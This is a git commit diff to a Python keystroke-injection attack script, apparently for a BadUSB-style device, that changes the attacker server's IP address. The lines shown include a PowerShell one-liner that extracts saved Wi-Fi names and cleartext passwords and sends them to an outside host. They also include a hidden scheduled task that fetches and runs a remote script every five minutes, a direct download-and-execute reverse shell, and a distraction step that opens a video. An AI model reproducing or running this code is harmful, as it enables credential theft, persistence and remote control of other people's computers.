9161980939642177f8331ff17bd6476f973e7e6f
JustFernandezz <fernandezoluwajuwonlo@gmail.com>
2026-01-24 15:47:26 +0100

    Update RevShell_Without_Admin.py

--- RevShell_Without_Admin.py
+++ RevShell_Without_Admin.py
@@ -21,7 +21,7 @@ layout.write("powershell\n")
 time.sleep(2)  # Wait for PowerShell to open
 
 # Step 3: Type the PowerShell command to send wifi credentials to the server
-powershell_command = '$ip="3.224.73.92";$port=5555;$profiles=(netsh wlan show profiles)|Select-String "All User Profile"|%{$_.ToString().Split(":")[1].Trim()};$data=@();foreach($p in $profiles){$info=netsh wlan show profile name="$p" key=clear|Select-String "Key Content";if($info){$pw=$info.ToString().Split(":")[1].Trim();$data+=@{SSID=$p;Password=$pw}}};$json=$data|ConvertTo-Json;$c=New-Object Net.Sockets.TcpClient($ip,$port);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$w.Write($json);$w.Flush();$w.Close();$c.Close()'
+powershell_command = '$ip="52.202.38.242";$port=5555;$profiles=(netsh wlan show profiles)|Select-String "All User Profile"|%{$_.ToString().Split(":")[1].Trim()};$data=@();foreach($p in $profiles){$info=netsh wlan show profile name="$p" key=clear|Select-String "Key Content";if($info){$pw=$info.ToString().Split(":")[1].Trim();$data+=@{SSID=$p;Password=$pw}}};$json=$data|ConvertTo-Json;$c=New-Object Net.Sockets.TcpClient($ip,$port);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$w.Write($json);$w.Flush();$w.Close();$c.Close()'
 layout.write(powershell_command + "\n")  # Type command and press Enter
 time.sleep(1.7)  # Wait for command execution
 layout.write("exit\n")  # Close PowerShell
@@ -35,7 +35,7 @@ layout.write("cmd\n")
 time.sleep(1.5)
 
 # Step 6: Run this cmd command to schedule task
-command = 'schtasks /create /tn "RunReversePowerShell" /tr "cmd.exe /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \\"iex (iwr \'http://3.224.73.92/reverse.ps1\')\\"" /sc minute /mo 5 /it /f'
+command = 'schtasks /create /tn "RunReversePowerShell" /tr "cmd.exe /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \\"iex (iwr \'http://52.202.38.242/reverse.ps1\')\\"" /sc minute /mo 5 /it /f'
 layout.write(command + "\n")
 time.sleep(1.5)
 layout.write("exit\n")
@@ -43,7 +43,7 @@ layout.write("exit\n")
 # Step 7: Powershell Reverse Shell
 kbd.send(Keycode.GUI, Keycode.R)
 time.sleep(1.6)
-layout.write('powershell -WindowStyle Hidden -ep Bypass -c "iex (iwr http://3.224.73.92/reverse.ps1)"\n')
+layout.write('powershell -WindowStyle Hidden -ep Bypass -c "iex (iwr http://52.202.38.242/reverse.ps1)"\n')
 time.sleep(2)
 
 # Step 8: Open a distraction (YouTube video)
